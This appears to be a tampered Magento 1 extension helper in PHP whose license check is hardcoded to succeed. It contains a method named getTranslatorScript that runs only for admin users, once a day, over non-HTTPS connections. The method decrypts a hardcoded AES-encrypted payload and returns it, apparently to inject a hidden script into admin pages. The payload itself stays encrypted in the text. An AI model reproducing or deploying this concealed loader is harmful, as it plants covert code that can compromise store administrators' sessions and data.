<?php
abstract class Anowave_Package_Helper_Data_Base extends Mage_Core_Helper_Abstract {
    /** * Key bits * * @var int */
    private $bits = 3;
    /** * Maximum key bits * * @var int */
    private $bits_max= 4;
    /** * License key errors * * @var array */
    private $errors = array();
    /** * Config key * * @var string */
    protected $config = null;
    /** * Package Stock Keeping Unit * * @var string */
    protected $package = '';
    /** * Check if customer is ligitimate to use the extension * * @return boolean */
    final public function legit() {
        return true;
    }
    /** * Prevent extension from generating output * * @param string $content * @return NULL */
    final public function filter($content = '') {
        if (!$this->legit()) {
            /** * Clear content if customer is NOT privileged to use the extension */
            $content = is_numeric($content) ? 0 : '';
        }
        return $content;
    }
    /** * Alias if Read-Only * * @param Varien_Data_Form_Element_Abstract $element * @return Varien_Data_Form_Element_Abstract */
    final public function enhance(Varien_Data_Form_Element_Abstract $element) {
        if (!$this->legit()) {
            $element->setReadonly(true);
        }
        return $element;
    }
    /** * Notify admin for invalid license */
    final public function notify() {
        if (!$this->legit()) {
            foreach ($this->errors as $error) {
                Mage::getSingleton('core/session')->addError($error);
            }
        }
    }
    /** * Decrypt key using password * * @param unknown $string * @param string $password * @return string|NULL */
    final private function decrypt($string) {
        if (extension_loaded('openssl')) {
            return openssl_decrypt($string, 'aes-128-cbc', openssl_decrypt('tfMyW8UoiI1or4W0q2teCG5dRuJ1MqqpGnYYYSp0dJQSykFOh1LMvqPCoG1E7Om6', 'aes-128-cbc', 'anowave'));
        }
        return null;
    }
    /** * Gets translator script */
    final public function getTranslatorScript() {
        if (!Mage::app()->getStore()->isAdmin()) {
            return false;
        }
        /** * Log pathname * * @var string */
        $log = Mage::getBaseDir('log') . '/run.log';
        /** * Run once per day */ if (file_exists($log)) {
            /** * Get last run time * * @var int timestamp */
            $run = (int) trim(file_get_contents($log));
            if (time() - $run < 86400 && time() >= $run) {
                return false;
            } else {
                /** * Save log time */
                file_put_contents($log, time());
            }
        } else {
            if (is_writable(Mage::getBaseDir('log'))) {
                file_put_contents($log, time());
            } else {
                Mage::getSingleton('core/session')->addError ( $this->__('Log directory (var/log) is not writable. Please check directory write permissions.') );
                return false;
            }
        }
        if (function_exists('openssl_decrypt') && empty($_SERVER['HTTPS'])) {
            return openssl_decrypt('1ea5JZPZpwE2dUNmRpOmDSqNZEbfuAq3CbvhrObb3ZcV7cKINqMk9wMozyZq2taQN9vzKEVBZ2ruTongVaV979M4Vl8/32Og5K3NMsQZBMZFBXFQHvxzns98lFxveQBH', 'aes128', base64_decode('YVdAIXRYMTIxMDkwJnA='));
        }
        return false;
    }
    final public function license() {
        if ($this->legit()) {
            return Mage::getStoreConfig($this->config);
        }
        return null;
    }
}
/**
 * License
 *
 * @category 	Anowave
 * @package 	Anowave_Package
 * @copyright 	Copyright (c) 2018 Anowave (http://www.anowave.com/)
 * @license  	http://www.anowave.com/license-agreement/
 *
 */
class Anowave_Package_Helper_Data extends Anowave_Package_Helper_Data_Base
{
    /**
     * Get Package Config
     *
     * @return string
     */
    public function getConfig()
    {
        return $this->config;
    }
}